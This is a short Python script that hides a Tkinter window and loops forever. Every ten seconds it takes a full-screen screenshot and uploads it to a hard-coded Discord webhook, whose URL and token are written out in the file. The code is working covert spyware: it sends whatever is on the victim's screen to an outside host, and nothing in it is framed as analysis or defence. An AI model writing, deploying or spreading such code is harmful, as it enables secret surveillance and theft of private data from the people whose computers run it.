import requests
from PIL import ImageGrab
import io
import time
import tkinter as tk  # Importing tkinter for GUI

webhook_url = "https://discord.com/api/webhooks/1289453262231306294/2mvDt8pJ2IgFGGTSuPX461D1sioknPfj7P5di4hxmIxD95IZZRWqN4v7K9q13H2NcQXj"

# Create a hidden Tkinter window
root = tk.Tk()
root.withdraw() 

while True:
    img_byte_arr = io.BytesIO()
    ImageGrab.grab().save(img_byte_arr, format='PNG')
    img_byte_arr.seek(0)
    requests.post(webhook_url, files={"file": ("screenshot.png", img_byte_arr, "image/png")})
    time.sleep(10)
